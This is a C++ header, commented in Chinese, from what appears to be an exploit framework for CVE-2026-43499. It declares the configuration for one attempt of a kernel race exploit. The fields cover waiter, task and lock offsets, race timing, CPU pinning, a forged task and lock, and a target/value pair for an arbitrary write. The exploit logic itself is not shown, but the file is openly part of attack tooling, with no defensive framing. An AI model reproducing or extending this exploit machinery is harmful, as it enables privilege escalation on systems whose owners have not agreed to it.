#pragma once
/** @file backend/cve_2026_43499/steps/route_config.hpp
 *  一次多播尝试要的配置，从已映射的值**纯函数**地建出来。
 *
 *  本树两条硬规矩落在这里：
 *   * **0 就是"调用方没说"** ⇒ 具名拒绝（`route-config-missing:<字段>`），
 *     绝不替调用方填一个"看起来合理"的默认值（窗口规则：调参数字不住在代码里）；
 *   * 键只读一处：所有字段由调用方从**同一张映射表**填好再进来。
 *
 *  主机可编（只用头文件里的值类型），设备侧才把它交给 `MulticastRoute`。
 */
#include <cstdint>

#include "backend/cve_2026_43499/memory/multicast_arm.hpp"
#include "backend/cve_2026_43499/route/multicast_policy.hpp"
#include "backend/cve_2026_43499/seam/multicast_route.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    /** 一次尝试要的每一个数，原样从 wire 读来：0 代表"没说"。 */
    struct RouteConfigValues final {
        /* 几何：四件套（waiter / task / lock 的位移与 buffer 长度）。 */
        std::uint64_t waiter_offset = 0U;
        std::uint64_t task_offset = 0U;
        std::uint64_t lock_offset = 0U;
        std::uint64_t buffer_size = 0U;
        /* 限值：次数、暖机轮数、每次保持。 */
        std::uint64_t max_attempts = 0U;
        std::uint64_t arm_sequence = 0U;
        std::uint64_t arm_hold = 0U;
        /* 竞态时序。 */
        std::uint64_t park_ms = 0U;
        std::uint64_t settle_us = 0U;
        /* 退役的两个相位（可为 0 = 调用方明确说"不等"，故非必需位）。 */
        std::uint64_t post_requeue_settle_us = 0U;
        std::uint64_t post_adjust_settle_us = 0U;
        /* 消费线程。 */
        std::uint64_t consumer_delay_us = 0U;
        std::uint64_t burst_calls = 0U;
        std::uint64_t max_calls = 0U;
        std::uint64_t fallback_lock_us = 0U;
        std::uint64_t nice_modulus = 0U;
        /* 固定 CPU 对（退役门禁要求 ✓）：不填 = 不 pin（-1），填 0 也是合法 CPU。 */
        std::int64_t main_cpu = -1;
        std::int64_t consumer_cpu = -1;
        std::uint64_t policy = 0U;
        /* 载荷页那一对：写谁、写什么。 */
        std::uint64_t target = 0U;
        std::uint64_t value = 0U;
        /* 伪造的任务与锁（来自准备产物）。 */
        std::uint64_t fake_task = 0U;
        std::uint64_t fake_lock = 0U;
    };

    /** 一次构建的结果：要么一份完整配置，要么一个具名拒绝。 */
    struct RouteConfigOutcome final {
        seam::MulticastRouteConfig config{};
        /** 缺哪个字段就叫哪个名字（`route-config-missing:<field>`），成功时为 nullptr。 */
        const char *refusal = nullptr;
    };

    /** 纯函数：值 ⇒ 配置。**任何一个必需位为 0 都是具名拒绝**，不填默认。 */
    [[nodiscard]] RouteConfigOutcome build_route_config(const RouteConfigValues &values) noexcept;

    /** 拒绝名的表（与执行体共用的那一张，供测试逐条核对）。 */
    [[nodiscard]] const char *route_config_refusal_name(const RouteConfigOutcome &outcome) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::steps
